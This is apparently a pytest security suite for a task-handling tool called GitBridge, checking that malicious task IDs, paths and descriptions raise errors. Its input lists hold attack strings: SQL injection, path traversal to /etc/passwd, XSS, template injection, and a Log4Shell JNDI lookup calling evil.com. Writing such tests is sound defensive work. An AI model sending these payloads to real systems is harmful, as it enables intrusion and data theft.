#!/usr/bin/env python3
"""Security validation testing suite for GitBridge."""

import pytest
import json
from pathlib import Path
from typing import Dict, Any
import re
import base64
import hashlib

from generate_task_chain import TaskParams, generate_single_task
from mas_delegate import load_and_validate_task

def test_task_id_validation():
    """Test task ID validation against injection attempts."""
    invalid_ids = [
        "task_P8SEC_001; DROP TABLE tasks;",
        "task_P8SEC_001\x00hidden",
        "../../../etc/passwd",
        "<script>alert('xss')</script>",
        "task_P8SEC_001' OR '1'='1"
    ]
    
    for invalid_id in invalid_ids:
        with pytest.raises(ValueError):
            params = TaskParams(
                phase_id="P8SEC",
                task_counter=1,
                description="Test task"
            )
            task = generate_single_task(params)
            task["task_id"] = invalid_id
            
            # Attempt to write malicious task
            test_log = Path("test_security.json")
            with test_log.open('w') as f:
                json.dump([task], f)
            
            # Should raise error during validation
            load_and_validate_task(test_log)
            
            # Cleanup
            test_log.unlink()

def test_path_traversal_prevention():
    """Test prevention of path traversal attacks."""
    malicious_paths = [
        "../../../etc/passwd",
        "..\\windows\\system32\\config",
        "/dev/null",
        "file:///etc/passwd",
        "\\\\evil-server\\share"
    ]
    
    for path in malicious_paths:
        params = TaskParams(
            phase_id="P8SEC",
            task_counter=1,
            description="Test task"
        )
        task = generate_single_task(params)
        
        # Attempt path traversal in outputs
        task["outputs"] = {
            "malicious": path
        }
        
        with pytest.raises(ValueError):
            test_log = Path("test_security.json")
            with test_log.open('w') as f:
                json.dump([task], f)
            load_and_validate_task(test_log)
            test_log.unlink()

def test_content_validation():
    """Test content validation and sanitization."""
    malicious_content = [
        "<script>alert('xss')</script>",
        "{{7*7}}",
        "${jndi:ldap://evil.com/x}",
        "Content-Type: text/html\r\n\r\n<script>",
        "eval(base64_decode('...'))"
    ]
    
    for content in malicious_content:
        params = TaskParams(
            phase_id="P8SEC",
            task_counter=1,
            description=content
        )
        
        with pytest.raises(ValueError):
            task = generate_single_task(params)
            test_log = Path("test_security.json")
            with test_log.open('w') as f:
                json.dump([task], f)
            load_and_validate_task(test_log)
            test_log.unlink()

def test_hash_validation():
    """Test hash validation for file integrity."""
    params = TaskParams(
        phase_id="P8SEC",
        task_counter=1,
        description="Test task"
    )
    task = generate_single_task(params)
    
    # Create test content and calculate valid hash
    content = b"Test content"
    valid_hash = hashlib.sha256(content).hexdigest()
    
    # Test with valid hash
    test_file = Path("test_output.txt")
    test_file.write_bytes(content)
    task["outputs"] = {
        "test": f"test_output.txt#sha256={valid_hash}"
    }
    
    # Should pass validation
    test_log = Path("test_security.json")
    with test_log.open('w') as f:
        json.dump([task], f)
    load_and_validate_task(test_log)
    
    # Test with invalid hash
    task["outputs"] = {
        "test": f"test_output.txt#sha256=invalid_hash"
    }
    with pytest.raises(ValueError):
        with test_log.open('w') as f:
            json.dump([task], f)
        load_and_validate_task(test_log)
    
    # Cleanup
    test_file.unlink()
    test_log.unlink()

def test_resource_limit_validation():
    """Test validation of resource limits."""
    # Test excessive description length
    with pytest.raises(ValueError):
        params = TaskParams(
            phase_id="P8SEC",
            task_counter=1,
            description="X" * 1000000  # Very long description
        )
        generate_single_task(params)
    
    # Test excessive number of sections
    with pytest.raises(ValueError):
        params = TaskParams(
            phase_id="P8SEC",
            task_counter=1,
            description="Test task",
            sections_reviewed=["1.1"] * 1000  # Too many sections
        )
        generate_single_task(params)

def test_input_sanitization():
    """Test input sanitization and normalization."""
    special_chars = [
        ("Hello\x00World", ValueError),  # Null byte
        ("Hello\nWorld", None),  # Valid newline
        ("Hello\r\nWorld", None),  # Valid line ending
        ("Hello\tWorld", None),  # Valid tab
        ("Hello\x1bWorld", ValueError),  # ESC character
    ]
    
    for input_str, expected_error in special_chars:
        if expected_error:
            with pytest.raises(expected_error):
                params = TaskParams(
                    phase_id="P8SEC",
                    task_counter=1,
                    description=input_str
                )
                generate_single_task(params)
        else:
            params = TaskParams(
                phase_id="P8SEC",
                task_counter=1,
                description=input_str
            )
            task = generate_single_task(params)
            assert task["description"] == input_str

if __name__ == "__main__":
    pytest.main(["-v", __file__]) 